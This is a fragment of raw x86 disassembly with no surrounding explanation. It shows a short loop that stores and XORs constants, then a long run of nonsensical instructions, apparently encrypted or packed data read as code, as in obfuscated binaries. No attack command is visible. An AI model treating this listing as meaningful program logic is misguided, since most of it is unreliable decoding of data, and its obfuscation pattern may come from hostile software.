  418baf:	mov    DWORD PTR [ebp-0x7c],0xe
  418bb6:	jmp    0x418bc2
  418bbb:	mov    eax,DWORD PTR [ebp-0x7c]
  418bbe:	dec    eax
  418bbf:	mov    DWORD PTR [ebp-0x7c],eax
  418bc2:	cmp    DWORD PTR [ebp-0x7c],0x0
  418bc6:	jbe    0x42b043
  418bcc:	mov    eax,DWORD PTR [ebp-0x7c]
  418bcf:	dec    eax
  418bd0:	xor    edx,edx
  418bd2:	push   0x2
  418bd4:	pop    ecx
  418bd5:	div    ecx
  418bd7:	mov    DWORD PTR [ebp-0x140],edx
  418bdd:	mov    eax,DWORD PTR [ebp-0x2c]
  418be0:	mov    DWORD PTR [ebp-0x13c],eax
  418be6:	mov    DWORD PTR [ebp-0x110],0xf89c8527
  418bf0:	mov    DWORD PTR [ebp-0x108],0xf89c85bd
  418bfa:	mov    DWORD PTR [ebp-0x118],0xf89c85b0
  418c04:	mov    DWORD PTR [ebp-0x11c],0xf89c85b3
  418c0e:	mov    DWORD PTR [ebp-0x104],0xf89c85b2
  418c18:	mov    eax,DWORD PTR [ebp-0x11c]
  418c1e:	xor    eax,0x75108b5
  418c23:	jmp    0x41afc9
  418c28:	adc    BYTE PTR [eax],0xb6
  418c2b:	push   ebp
  418c2c:	xor    al,0x75
  418c2e:	pusha  
  418c2f:	push   esp
  418c30:	dec    edx
  418c31:	repz jae 0x418c1c
  418c34:	jne    0x418c7d
  418c36:	xchg   ebp,eax
  418c37:	aam    0x39
  418c39:	mov    dh,0x7a
  418c3b:	jnp    0x418c3f
  418c3d:	cwde   
  418c3e:	jnp    0x418cbb
  418c40:	fsub   st(2),st
  418c42:	mov    dh,0xec
  418c44:	enter  0xcfe6,0xe6
  418c48:	fidiv  DWORD PTR [edi-0x44162b15]
  418c4e:	clc    
  418c4f:	into   
  418c50:	(bad)  
  418c51:	(bad)  
  418c52:	clc    
  418c53:	int3   
  418c54:	rcl    ch,0x3
  418c57:	add    esp,esi
  418c59:	cld    
  418c5a:	or     al,ah
  418c5c:	psubusw mm5,mm1
  418c5f:	lds    ebp,FWORD PTR [ecx-0x2a081549]
  418c65:	out    0xdb,eax
  418c67:	mov    al,0xad
  418c69:	mov    ebx,0xb9b5fdd3
  418c6e:	idiv   DWORD PTR [eax-0x39413939]
  418c74:	ret    0xb03
  418c77:	add    al,0xf8
  418c79:	add    eax,0x807c50f
  418c7e:	into   
  418c7f:	out    dx,al
  418c80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c81:	lds    edi,FWORD PTR [ebp-0x49452c0e]
  418c87:	enter  0xf7c7,0xe9
  418c8b:	out    dx,al
  418c8c:	(bad)  
  418c8d:	jecxz  0x418c70
  418c8f:	mov    ecx,0x7dcc7d2
  418c94:	(bad)  
  418c96:	std    
  418c97:	fcomp  st(3)
  418c99:	shl    dl,0x8
  418c9c:	adc    eax,esp
  418c9e:	in     eax,dx
  418c9f:	mov    esi,0xe7abf2d2
  418ca4:	out    0xcf,eax
  418ca6:	shl    BYTE PTR [ecx-0x2e170636],1
  418cac:	int3   
  418cad:	loop   0x418c83
  418caf:	loopne 0x418cb2
  418cb1:	mov    ah,0x4
  418cb3:	(bad)  
  418cb5:	jecxz  0x418ca2
  418cb7:	fmul   QWORD PTR [ecx]
  418cb9:	(bad)  
  418cba:	(bad)  
  418cbc:	into   
  418cbd:	cli    
  418cbe:	stos   DWORD PTR es:[edi],eax
  418cbf:	iret   
  418cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cc1:	lods   eax,DWORD PTR ds:[esi]
  418cc2:	cmc    
  418cc3:	call   0xd027578b
  418cc8:	mov    ecx,0xe8c9e8f3
  418ccd:	add    ch,ch
  418ccf:	int3   
  418cd0:	in     al,dx
  418cd1:	loopne 0x418ca0
  418cd3:	add    al,0xf1
  418cd5:	push   es
  418cd6:	stc    
  418cd7:	(bad)  
  418cd9:	into   
  418cda:	iret   
  418cdb:	retf   
  418cdc:	pmaxsw mm4,mm2
  418cdf:	rcr    dh,1
  418ce1:	(bad)  
  418ce2:	jmp    0x418ca5
  418ce4:	mov    cl,0xda
  418ce6:	retf   0xb8f2
  418ce9:	(bad)  
  418cea:	call   0xc31658b8
  418cef:	loopne 0x418cd2
  418cf1:	(bad)  
  418cf2:	mov    ebx,0x6f5dcf6
  418cf7:	dec    BYTE PTR [esi]
  418cf9:	neg    bh
  418cfb:	push   es
  418cfc:	out    dx,al
  418cfd:	loopne 0x418caa
  418cff:	in     al,dx
  418d00:	mov    ebp,0xe9e5e1c4
  418d05:	(bad)
  418d08:	in     al,0xb6
  418d0a:	hlt    
  418d0b:	fiadd  WORD PTR [edx]
  418d0d:	call   0xf30185cb
  418d12:	fld    DWORD PTR [edx]
  418d14:	add    eax,0xc6d7d803
  418d19:	cli    
  418d1a:	loopne 0x418d00
  418d1c:	add    eax,0xb1aaa7cb
  418d21:	(bad)  
  418d22:	call   0xc509650f
  418d27:	fisubr DWORD PTR [ebp-0x443b2c0d]
  418d2d:	out    dx,al
  418d2e:	int    0xd3
  418d30:	mov    ecx,0xdbfdc105
  418d35:	or     bh,bl
  418d37:	out    0xc5,al
  418d39:	jmp    0xc2ac:0xdfac9ee
  418d40:	shl    bh,1
  418d42:	jmp    0x418d1f
  418d44:	into   
  418d45:	(bad)  
  418d46:	in     al,0xf8
  418d48:	mov    al,0xf4
  418d4a:	mov    edx,0xf7baf9df
  418d4f:	aam    0xd0
  418d51:	int3   
  418d52:	aad    0x3
  418d54:	push   es
  418d55:	rcr    ch,0xfb
  418d58:	rol    dh,0xca
  418d5b:	out    0xce,eax
  418d5d:	int3   
  418d5e:	shl    edi,cl
  418d60:	loop   0x418d23
  418d62:	ret    0xc6c0
  418d65:	test   al,0xba
  418d67:	int3   
  418d68:	idiv   ebp
  418d6a:	(bad)  
  418d6b:	mov    eax,0xf003b9ca
  418d70:	ret    0xf2bc
  418d73:	fadd   DWORD PTR [eax]
  418d75:	fcomi  st,st(1)
  418d77:	add    bl,ch
  418d79:	aam    0xf9
  418d7b:	loope  0x418d82
  418d7d:	or     edi,ebx
  418d7f:	(bad)
  418d82:	loope  0x418d51
  418d84:	lock out dx,al
  418d86:	cmc    
  418d87:	into   
  418d88:	jmp    0xf7c8:0x3cddfac
  418d8f:	add    eax,DWORD PTR [ebx]
  418d91:	in     eax,0x1
  418d93:	inc    DWORD PTR [eax]
  418d95:	xlat   BYTE PTR ds:[ebx]
  418d96:	std    
  418d97:	(bad)  
  418d98:	test   esp,0xe606dfe6
  418d9e:	(bad)  
  418da0:	icebp  
  418da1:	jmp    0xe4da:0xd2b7c3f1
  418da8:	in     al,dx
  418da9:	mov    ecx,0xd9fceef9
  418dae:	sti    
  418daf:	mov    edi,0xc2f3bee6
  418db4:	jmp    0xdef:0xd4e80706
  418dbb:	ret    0xfda
  418dbe:	(bad)  
  418dbf:	bnd ret 
  418dc1:	(bad)  
  418dc2:	shr    DWORD PTR [edx-0x141a4810],0xbf
  418dc9:	out    dx,al
  418dca:	fcomi  st,st(6)
  418dcc:	jmp    0xc02e6cc4
  418dd1:	int    0xbc
  418dd3:	or     eax,esp
  418dd5:	test   bh,0xa
  418dd8:	(bad)  
  418dd9:	fsubrp st(0),st
  418ddb:	or     al,0xf8
  418ddd:	fcomip st,st(1)
  418ddf:	lds    ebp,FWORD PTR [esi-0x1b121212]
  418de5:	(bad)  
  418de6:	int    0xcf
  418de8:	fcom   st(2)
  418dea:	jmp    0xfb3690a8
  418def:	out    dx,al
  418df0:	aam    0xd4
  418df2:	loop   0x418de8
  418df4:	or     esp,ecx
  418df6:	fmul   DWORD PTR [edx]
  418df8:	aad    0xdb
  418dfa:	leave  
  418dfb:	out    dx,al
  418dfc:	or     ebx,edx
  418dfe:	int    0xd7
  418e00:	in     eax,dx
  418e01:	shl    esp,1
  418e03:	int    0xf7
  418e05:	test   edi,0xf7b8b7b5
  418e0b:	cld    
  418e0c:	push   edi
  418e0e:	iret   
  418e0f:	cmc    
  418e10:	lock mov esp,0xfef4fc07
  418e16:	(bad)  
  418e18:	in     al,0x9
  418e1a:	(bad)  
  418e1b:	fld    QWORD PTR [eax]
  418e1d:	add    BYTE PTR [eax-0x171b1321],ch
  418e23:	mov    dh,0xf1
  418e25:	hlt    
  418e26:	(bad)
  418e29:	icebp  
  418e2a:	icebp  
  418e2b:	in     eax,dx
  418e2c:	shr    al,cl
  418e2e:	call   0xd43b85f5
  418e33:	aad    0xc2
  418e35:	ret    0xe8e6
  418e38:	(bad)  
  418e39:	(bad)  
  418e3a:	jecxz  0x418e0a
  418e3c:	add    eax,0xb2e2c5d8
  418e41:	scas   eax,DWORD PTR es:[edi]
  418e42:	div    BYTE PTR [eax-0xf323e37]
  418e48:	mov    ecx,0xdbdfbadb
  418e4d:	int    0xc3
  418e4f:	enter  0xbdce,0xd2
  418e53:	jecxz  0x418e15
  418e55:	in     eax,0xf7
  418e57:	retf   
  418e58:	aad    0x5
  418e5a:	(bad)
  418e5d:	fadd   st(3),st
  418e5f:	mov    eax,0xe7eee1e0
  418e64:	in     eax,dx
  418e65:	sar    BYTE PTR [ebx-0x36044a18],1
  418e6b:	idiv   ch
  418e6d:	add    edi,eax
  418e6f:	lock not esi
  418e72:	in     eax,0xe6
  418e74:	loop   0x418e72
  418e76:	fld    DWORD PTR [esi]
  418e78:	jmp    0xefce:0xc1e4e4f8
  418e7f:	out    0xdc,eax
  418e81:	in     al,dx
  418e82:	retf   
  418e83:	(bad)  
  418e84:	jmp    0xdcfa:0xeaccb5ec
  418e8b:	sti    
  418e8c:	fdivrp st(0),st
  418e8e:	cmc    
  418e8f:	out    dx,eax
  418e90:	add    esi,esp
  418e92:	stc    
  418e93:	fdivr  st(4),st
  418e95:	add    ah,ah
  418e97:	hlt    
  418e98:	out    0x8,al
  418e9a:	loopne 0x418e90
  418e9c:	clc    
  418e9d:	add    ch,cl
  418e9f:	shr    BYTE PTR [eax+esi*4-0x324f3320],1
  418ea6:	shr    cl,0xd9
  418ea9:	lods   al,BYTE PTR ds:[esi]
  418eaa:	inc    DWORD PTR [ebx]
  418eac:	lock mov edi,0xded3f5d2
  418eb2:	sti    
  418eb3:	fld    DWORD PTR ds:0xd8fbc7c4
  418eb9:	stc    
  418eba:	add    dh,cl
  418ebc:	sti    
  418ebd:	shr    bl,0xdc
  418ec0:	test   eax,0xcdc1b5d5
  418ec5:	cli    
  418ec6:	mov    bl,0xf1
  418ec8:	shr    BYTE PTR [edx+edi*8-0x16031d2f],cl
  418ecf:	into   
  418ed0:	stc    
  418ed1:	rcl    ebx,1
  418ed3:	pop    es
  418ed4:	ret    0xe700
  418ed7:	fimul  WORD PTR [edx]
  418ed9:	cmc    
  418eda:	fld    DWORD PTR [edx]
  418edc:	loop   0x418ebd
  418ede:	mov    bl,0xbd
  418ee0:	(bad)  
  418ee1:	(bad)  [ebx-0x183a1f13]
  418ee7:	mov    eax,0xe3dbf0e9
  418eec:	retf   0xb7de
  418eef:	(bad)  
  418ef0:	icebp  
  418ef1:	int3   
  418ef2:	shl    eax,0xf3
  418ef5:	fcomp  st(3)
  418ef7:	jmp    0xa1e900a
  418efc:	in     eax,0x0
  418efe:	in     eax,dx
  418eff:	leave  
  418f00:	lods   eax,DWORD PTR ds:[esi]
  418f01:	mov    dl,0xef
  418f03:	loope  0x418ecf
  418f05:	aam    0xe7
  418f07:	aam    0xf9
  418f09:	mov    ecx,0xcdbb03e4
  418f0e:	icebp  
  418f0f:	fptan  
  418f11:	lock in al,dx
  418f13:	(bad)  
  418f14:	mov    ebp,0xddd0c5da
  418f19:	(bad)  
  418f1b:	add    eax,0xf7e2040c
  418f20:	mov    ebp,0xf0e0cfb6
  418f25:	mov    edx,0xd6f9e8c9
  418f2a:	mov    dh,0xb2
  418f2c:	rcl    dh,cl
  418f2e:	iret   
  418f2f:	test   bh,0xed
  418f32:	in     al,dx
  418f33:	mov    edi,0xdbd5d8f2
  418f39:	or     BYTE PTR [edx],cl
  418f3b:	les    ecx,FWORD PTR ds:0xe2add00f
  418f41:	jecxz  0x418f00
  418f43:	icebp  
  418f44:	enter  0xfaca,0xcd
  418f48:	(bad)  
  418f49:	lock in eax,0xb6
  418f4c:	fstp   TBYTE PTR [ecx-0xa1e1221]
  418f52:	(bad)
  418f55:	div    edi
  418f57:	fadd   QWORD PTR [edx]
  418f59:	in     al,0xf5
  418f5b:	int3   
  418f5c:	enter  0xedca,0xe2
  418f60:	(bad)  
  418f61:	repnz leave 
  418f63:	les    esi,FWORD PTR [ebp-0x52301809]
  418f69:	cmc    
  418f6a:	(bad)  
  418f6b:	mov    dh,0xf7
  418f6d:	ret    0xcdbd
  418f70:	shl    dh,cl
  418f72:	shl    ebp,0x0
  418f75:	out    0xbf,al
  418f77:	(bad)
  418f7b:	loop   0x418f45
  418f7d:	fcmovb st,st(6)
  418f7f:	mov    eax,0xe3c5cbe5
  418f84:	shl    dh,1
  418f86:	loopne 0x418f36
  418f88:	(bad)  
  418f89:	repnz aad 0xd9
  418f8c:	retf   0xf1d7
  418f8f:	mov    ebp,0xebbdd4fd
  418f94:	(bad)  
  418f96:	hlt    
  418f97:	hlt    
  418f98:	out    0xcb,eax
  418f9a:	pmaxsw mm1,QWORD PTR [edx]
  418f9d:	out    0xa7,eax
  418f9f:	(bad)  
  418fa1:	imul   ecx
  418fa3:	in     al,0xe1
  418fa5:	in     eax,0xd9
  418fa7:	sti    
  418fa8:	fdiv   st,st(5)
  418faa:	fucomi st,st(0)
  418fac:	mov    ch,0xd6
  418fae:	ret    
  418faf:	sar    BYTE PTR [esi+ebp*8-0x3ff81f04],0xfd
  418fb7:	out    dx,eax
  418fb8:	(bad)
  418fbb:	fmul   st,st(5)
  418fbd:	in     eax,0xf3
  418fbf:	(bad)  
  418fc0:	mov    bh,0xeb
  418fc2:	retf   
  418fc3:	mov    ah,0xee
  418fc5:	mov    cl,0xe9
  418fc7:	(bad)  
  418fc8:	sar    DWORD PTR [ecx-0x43104331],cl
  418fce:	xlat   BYTE PTR ds:[ebx]
  418fcf:	rcl    bh,0xfa
  418fd2:	loop   0x418fa4
  418fd4:	in     al,0xff
  418fd6:	std    
  418fd7:	(bad)  
  418fd8:	call   0xeb3f7ed3
  418fdd:	adc    ebx,esi
  418fdf:	call   0xc1377697
  418fe4:	out    0xef,al
  418fe6:	mov    al,0xd2
  418fe8:	sti    
  418fe9:	mov    bh,0xf2
  418feb:	leave  
  418fec:	fnstcw WORD PTR [ebx-0x43f2b08]
  418ff2:	pop    es
  418ff3:	(bad)  
  418ff4:	out    0xe4,al
  418ff6:	mov    edi,0xce4fedd
  418ffb:	fucom  st(4)
  418ffd:	jmp    0x418fa9
  418fff:	call   0xd73583ad
  419004:	fcmovb st,st(2)
  419006:	into   
  419007:	lock lock shl ebx,1
  41900b:	leave  
  41900c:	sti    
  41900d:	ror    bh,1
  41900f:	add    ecx,esp
  419011:	fdivrp st(0),st
  419013:	add    dl,ah
  419015:	(bad)  
  419016:	cld    
  419017:	or     BYTE PTR [ebx],cl
  419019:	add    eax,0x5e20fe0
  41901e:	jmp    0xb5b5:0xf3f6c5df
  419025:	(bad)  
  419026:	out    0xd3,al
  419028:	iret   
  419029:	fptan  
  41902b:	lock jecxz 0x419027
  41902e:	loopne 0x419011
  419030:	in     al,dx
  419031:	(bad)  
  419033:	out    0xe7,al
  419035:	loopne 0x41901c
  419037:	stc    
  419038:	neg    ecx
  41903a:	iret   
  41903b:	loopne 0x419025
  41903d:	loop   0x419031
  41903f:	int3   
  419040:	lods   al,BYTE PTR ds:[esi]
  419041:	into   
  419042:	out    0xc6,al
  419044:	mov    bl,0xc5
  419046:	mov    edx,0xdcf8d0c8
  41904b:	lock mov eax,0xc3fbfadf
  419051:	mov    eax,0x7f8f0fd
  419056:	add    ebx,ecx
  419058:	psubusw mm1,mm3
  41905b:	or     eax,0xe3e4f2fa
  419060:	(bad)  
  419061:	mov    esi,0xe7fbd7b1
  419066:	out    dx,eax
  419067:	(bad)  
  419068:	neg    edx
  41906a:	int    0xd5
  41906c:	repnz xlat BYTE PTR ds:[ebx]
  41906e:	fucom  st(2)
  419070:	out    dx,al
  419071:	div    ecx
  419073:	repnz (bad) 
  419075:	ffree  st(2)
  419077:	not    edi
  419079:	fldpi  
  41907b:	(bad)  
  41907d:	add    eax,0xd7cdb3bd
  419082:	(bad)
  419085:	repnz cmc 
  419087:	shr    edi,cl
  419089:	mov    esi,0xbdd8f7d9
  41908e:	aad    0xce
  419090:	cld    
  419091:	mov    ebp,0x7b90005
  419096:	or     edx,ebp
  419098:	out    0xe8,al
  41909a:	in     eax,dx
  41909b:	jmp    0x419081
  41909d:	retf   0xb3f2
  4190a0:	in     eax,dx
  4190a1:	int    0xf4
  4190a3:	imul   bl
  4190a5:	fcomi  st,st(1)
  4190a7:	iret   
  4190a8:	(bad)  
  4190a9:	(bad)  
  4190aa:	fidiv  WORD PTR [edx+0x1d7f1e3]
  4190b0:	repz fidivr DWORD PTR [edi+0x6c7bdda]
  4190b7:	loop   0x419093
  4190b9:	(bad)  
  4190ba:	loop   0x419087
  4190bc:	bswap  ebp
  4190be:	in     al,dx
  4190bf:	int3   
  4190c0:	loope  0x4190ac
  4190c2:	stos   DWORD PTR es:[edi],eax
  4190c3:	mov    dl,0xf0
  4190c5:	in     al,0xb7
  4190c7:	jmp    0x41909a
  4190c9:	mov    edi,0xf2f6cec5
  4190ce:	ret    
  4190cf:	dec    edi
  4190d1:	loopne 0x419096
  4190d3:	std    
  4190d4:	idiv   ch
  4190d6:	sti    
  4190d7:	pop    es
  4190d8:	jmp    0x41909e
  4190da:	jmp    0x4190e1
  4190dc:	in     eax,0xf2
  4190de:	fdivr  DWORD PTR [edx+edx*8-0x1e3f1a40]
  4190e5:	out    0xd6,al
  4190e7:	in     al,dx
  4190e8:	iret   
  4190e9:	in     eax,dx
  4190ea:	mov    ch,0xc4
  4190ec:	ret    
  4190ed:	out    dx,eax
  4190ee:	fucom  st(7)
  4190f0:	inc    edi
  4190f2:	(bad)  
  4190f3:	xlat   BYTE PTR ds:[ebx]
  4190f4:	add    al,0xf9
  4190f6:	add    BYTE PTR [esi],al
  4190f8:	les    eax,FWORD PTR [esi+ebp*8]
  4190fb:	add    ecx,edi
  4190fd:	fsubr  QWORD PTR [ecx-0x1f5b1452]
  419103:	mov    dl,0xe1
  419106:	retf   
  419107:	mov    dh,0xe8
  419109:	in     eax,0xe5
  41910b:	enter  0xb8ff,0xd4
  41910f:	cmc    
  419110:	std    
  419111:	(bad)  
  419113:	mov    DWORD PTR [edx],0xeee5f6df
  419119:	fiadd  DWORD PTR [ebx]
  41911b:	stc    
  41911c:	std    
  41911d:	in     eax,dx
  41911e:	mov    eax,0xd2adf6d8
  419123:	out    dx,al
  419124:	mov    bl,0xba
  419126:	mov    ch,0xda
  419128:	out    0xff,eax
  41912a:	mov    bl,0xff
  41912c:	out    dx,eax
  41912d:	into   
  41912e:	shr    edi,0xf8
  419131:	mov    edx,0xd8f8f4d8
  419137:	enter  0xcbdb,0xff
  41913b:	push   cs
  41913c:	(bad)  
  41913d:	(bad)  
  41913f:	rcr    ah,cl
  419141:	faddp  st(0),st
  419143:	lock jmp 0x419138
  419146:	mov    bl,0xdf
  419148:	sti    
  419149:	aad    0xdc
  41914b:	call   0xf4458646
  419150:	in     eax,dx
  419151:	(bad)  
  419153:	ret    
  419154:	sar    DWORD PTR [ebx+ecx*1-0xb02f537],0xc
  41915c:	les    ecx,FWORD PTR [esi]
  41915e:	(bad)  
  41915f:	jmp    0x419152
  419161:	mov    cl,0xdd
  419163:	sti    
  419164:	(bad)  
  419165:	out    dx,al
  419166:	in     eax,0xcc
  419168:	stc    
  419169:	in     al,dx
  41916a:	shr    dh,cl
  41916c:	jmp    0xff258e52
  419171:	inc    eax
  419173:	(bad)  
  419174:	sti    
  419175:	mov    esp,0xfbc0fee9
  41917a:	(bad)  
  41917c:	cli    
  41917d:	or     al,0xe7
  41917f:	loopne 0x41914f
  419181:	mov    ebp,0xd5b2e9e5
  419186:	mov    ebx,0xdeb8ffce
  41918b:	mov    ebx,0xd9e9fdce
  419190:	fcmovne st,st(4)
  419192:	int3   
  419193:	fiadd  WORD PTR [edx]
  419195:	jmp    0xfbe2:0xf4f60201
  41919c:	cld    
  41919d:	adc    ebp,DWORD PTR [ebx-0x2d3b3712]
  4191a3:	into   
  4191a4:	int    0xc5
  4191a6:	jmp    0xcae8:0xbaf8f5f0
  4191ad:	(bad)  
  4191ae:	loop   0x419172
  4191b0:	loope  0x4191a7
  4191b2:	fild   DWORD PTR ds:0xcafcfd00
  4191b8:	test   DWORD PTR [eax],0xeddbe00a
  4191be:	in     eax,0xbd
  4191c0:	ror    cl,cl
  4191c2:	enter  0xefd1,0xa8
  4191c6:	enter  0xd2b9,0xc9
  4191ca:	fdivr  DWORD PTR [esi-0x3f024516]
  4191d0:	sar    ebp,cl
  4191d2:	loopne 0x4191b0
  4191d4:	repnz fsub st,st(1)
  4191d7:	loopne 0x4191e1
  4191d9:	(bad)  
  4191da:	in     eax,dx
  4191db:	adc    ecx,ebx
  4191dd:	jecxz  0x419187
  4191df:	leave  
  4191e0:	(bad)  
  4191e1:	in     al,dx
  4191e2:	in     al,dx
  4191e3:	icebp  
  4191e4:	mov    cl,0xcc
  4191e6:	stc    
  4191e7:	mov    edx,0xf4ffd0c9
  4191ec:	mov    ch,0xe3
  4191ee:	rcl    eax,0xee
  4191f1:	int3   
  4191f2:	(bad)  
  4191f3:	in     al,dx
  4191f4:	jecxz  0x4191e8
  4191f6:	or     DWORD PTR ds:0x80ae2f8,eax
  4191fc:	add    esp,edi
  4191fe:	stos   BYTE PTR es:[edi],al
  4191ff:	jmp    0xb3335cee
  419204:	retf   
  419205:	(bad)  [esi-0x2b30114c]
  41920b:	(bad)  
  41920c:	repnz add ecx,edi
  41920f:	out    dx,al
  419210:	not    dl
  419212:	loope  0x419214
  419214:	out    0xa,al
  419216:	hlt    
  419217:	cli    
  419218:	iret   
  419219:	in     eax,dx
  41921a:	push   cs
  41921b:	leave  
  41921c:	repz retf 0xe4ad
  419220:	repz scas eax,DWORD PTR es:[edi]
  419222:	loope  0x419217
  419224:	mov    dl,0xd0
  419226:	iret   
  419227:	call   0xdaf756f4
  41922c:	retf   0xd0d3
  41922f:	shr    esi,cl
  419231:	mov    ebp,0xd6d5e4d7
  419236:	cld    
  419237:	jecxz  0x419248
  419239:	enter  0xfc05,0xfb
  41923d:	or     al,0xf0
  41923f:	out    dx,al
  419240:	(bad)  
  419242:	aad    0xcf
  419244:	out    dx,al
  419245:	fnstcw WORD PTR [edx-0xc341550]
  41924b:	into   
  41924c:	mov    ebp,0x1e1cded
  419251:	sar    ah,0xf3
  419254:	(bad)  
  419256:	add    ecx,eax
  419258:	out    dx,eax
  419259:	loopne 0x419266
  41925b:	add    eax,0xa9e802e9
  419260:	mov    edi,0xbbd1ecec
  419265:	shl    ch,1
  419267:	mov    ah,0xff
  419269:	cli    
  41926a:	mov    ecx,0xf8c3b4f4
  41926f:	loope  0x419242
  419271:	repz in eax,0xd0
  419274:	hlt    
  419275:	mov    BYTE PTR [eax+eax*1],0x8
  419279:	hlt    
  41927a:	stc    
  41927b:	ret    0xccfa
  41927e:	mov    dl,0xd7
  419280:	(bad)  
  419281:	in     eax,0xc6
  419283:	in     eax,0xac
  419285:	stc    
  419286:	mov    bl,0xb8
  419288:	jmp    0xdf376f5e
  41928d:	cli    
  41928e:	stc    
  41928f:	call   0xc839564c
  419294:	jmp    0xe6dd:0xd7e4caf5
  41929b:	pop    es
  41929c:	jecxz  0x419276
  41929e:	(bad)  
  4192a0:	fsub   st(6),st
  4192a2:	loopne 0x419260
  4192a4:	call   0xb5144580
  4192a9:	mov    edx,0xe8ddd1b8
  4192ae:	ror    esi,cl
  4192b0:	mov    ch,0xcd
  4192b2:	rol    DWORD PTR [ecx],cl
  4192b4:	or     edx,ecx
  4192b6:	in     eax,0xfc
  4192b8:	les    ecx,FWORD PTR [ebx]
  4192ba:	loopne 0x41927e
  4192bc:	add    dh,bl
  4192be:	int3   
  4192bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192c0:	mov    ebp,0xc9c7c1ad
  4192c5:	jmp    0x4192a2
  4192c7:	out    dx,eax
  4192c8:	mov    edi,0xcbd7f6ac
  4192cd:	enter  0xdce0,0xb9
  4192d1:	add    esp,edx
  4192d3:	(bad)  
  4192d4:	in     al,0xfb
  4192d6:	or     ebp,ecx
  4192d8:	fcmovnu st,st(4)
  4192da:	fstp   st(6)
  4192dc:	out    dx,al
  4192dd:	fcmove st,st(7)
  4192df:	(bad)  
  4192e0:	jmp    0xe13284b2
  4192e5:	out    0xe8,eax
  4192e7:	rcl    dl,cl
  4192e9:	enter  0xc9f2,0xba
  4192ed:	mov    edx,0xfec1c8f3
  4192f2:	out    0xbc,al
  4192f4:	add    esi,edi
  4192f6:	jecxz  0x4192db
  4192f8:	dec    DWORD PTR [ecx]
  4192fa:	fiadd  DWORD PTR [edi]
  4192fc:	stc    
  4192fd:	out    0xf1,eax
  4192ff:	mov    ebp,0xcfaeeced
  419304:	lock test al,0xd4
  419307:	call   0xce2089d1
  41930c:	in     al,dx
  41930d:	fcmovnu st,st(0)
  41930f:	iret   
  419310:	mov    ecx,0xe205d4cd
  419315:	or     esp,edi
  419317:	loope  0x4192f8
  419319:	pminub mm7,mm1
  41931c:	in     al,dx
  41931d:	int3   
  41931e:	icebp  
  41931f:	loope  0x41930c
  419321:	call   0xeb22691c
  419326:	call   0xb8418adb
  41932b:	add    esi,ebp
  41932d:	cli    
  41932e:	cmc    
  41932f:	hlt    
  419330:	repz mov esp,0xdd01d5fa
  419336:	out    0xdd,al
  419338:	std    
  419339:	add    eax,0xce06ede5
  41933e:	out    0xc0,al
  419340:	icebp  
  419341:	ret    
  419342:	les    esi,FWORD PTR [edx-0x3b4b3018]
  419348:	fyl2xp1 
  41934a:	rcl    edi,cl
  41934c:	(bad)  
  41934d:	sar    ah,1
  41934f:	add    BYTE PTR [ecx+0x101fed4],bh
  419355:	rol    DWORD PTR [ecx],1
  419357:	lock aad 0xe7
  41935a:	in     eax,0xea
  41935c:	loopne 0x419338
  41935e:	les    ebp,FWORD PTR [ecx-0x4c0c0d1e]
  419364:	ret    
  419365:	in     al,0xc0
  419367:	repz mov cl,0xeb
  41936a:	in     al,dx
  41936b:	repz out dx,al
  41936d:	fdivr  st(2),st
  41936f:	std    
  419370:	mov    edi,0xf2fde706
  419375:	lock (bad) 
  419378:	push   cs
  419379:	jmp    0x41934f
  41937b:	add    dl,BYTE PTR [ebx]
  41937d:	int    0xc9
  41937f:	mov    al,0xca
  419381:	out    dx,al
  419382:	ret    
  419383:	into   
  419384:	mov    ch,0xf1
  419386:	int3   
  419387:	leave  
  419388:	fdecstp 
  41938a:	xlat   BYTE PTR ds:[ebx]
  41938b:	mov    edi,0xdefde2d5
  419390:	cmc    
  419391:	int    0xbd
  419393:	aam    0xdc
  419395:	or     eax,DWORD PTR [ecx]
  419397:	leave  
  419398:	std    
  419399:	jmp    0xfd358c69
  41939e:	jmp    0xb5aa:0xb6f6b0c6
  4193a5:	icebp  
  4193a6:	icebp  
  4193a7:	mov    ah,0xb1
  4193a9:	aam    0xf9
  4193ab:	jmp    0x41936c
  4193ad:	ret    
  4193ae:	shl    cl,cl
  4193b0:	fadd   st,st(6)
  4193b2:	pop    es
  4193b3:	jmp    0x41937b
  4193b5:	stc    
  4193b6:	mov    edi,0xc9e8eaeb
  4193bb:	in     al,dx
  4193bc:	fucomi st,st(2)
  4193be:	loop   0x4193b0
  4193c0:	loopne 0x4193aa
  4193c2:	retf   
  4193c3:	retf   0xd5b7
  4193c6:	sti    
  4193c7:	(bad)  
  4193c9:	(bad)  
  4193ca:	fsub   st(2),st
  4193cc:	mov    eax,0xf1c0dde9
  4193d1:	fdivr  st,st(5)
  4193d3:	(bad)  
  4193d4:	fcomi  st,st(0)
  4193d6:	out    0xdf,eax
  4193d8:	fucomip st,st(1)
  4193da:	(bad)  
  4193dc:	(bad)  
  4193dd:	jmp    0xd6f47ba9
  4193e2:	ret    
  4193e3:	rol    esp,1
  4193e5:	(bad)  
  4193e6:	enter  0xeeb4,0xe5
  4193ea:	mov    bl,0xf3
  4193ec:	mov    edi,0xbd07eecf
  4193f1:	idiv   BYTE PTR [edi-0x352d1504]
  4193f7:	or     bh,bh
  4193f9:	retf   0xe2d9
  4193fc:	sti    
  4193fd:	enter  0xe2df,0xcb
  419401:	(bad)  
  419402:	loopne 0x4193f2
  419404:	jmp    0xfb2a8cea
  419409:	mov    bh,0xc8
  41940b:	mov    eax,0xdbf1c9c8
  419410:	add    ecx,esi
  419412:	ror    esp,1
  419414:	aad    0xd1
  419416:	add    eax,0xd902f4dd
  41941b:	sti    
  41941c:	std    
  41941d:	or     edi,DWORD PTR [ecx-0x1b28384f]
  419423:	mov    ah,0xc0
  419425:	into   
  419426:	fcom   st(7)
  419428:	fidivr DWORD PTR [ecx-0x36120b29]
  41942e:	leave  
  41942f:	fstp   st(6)
  419431:	ffreep st(2)
  419433:	rol    al,1
  419435:	mov    BYTE PTR [ebx+eax*1],0xb
  419439:	fsubrp st(2),st
  41943b:	out    0xe8,eax
  41943d:	(bad)
  419441:	mov    dl,0xee
  419443:	retf   
  419444:	repz cli 
  419446:	ror    eax,0xd7
  419449:	iret   
  41944a:	cmc    
  41944b:	in     al,0xf1
  41944d:	add    ch,bh
  41944f:	ret    0xdef3
  419452:	ret    0xdeda
  419455:	add    bh,al
  419457:	add    ecx,eax
  419459:	iret   
  41945a:	fiadd  DWORD PTR ds:0xd8ddcd08
  419460:	int    0xb6
  419462:	icebp  
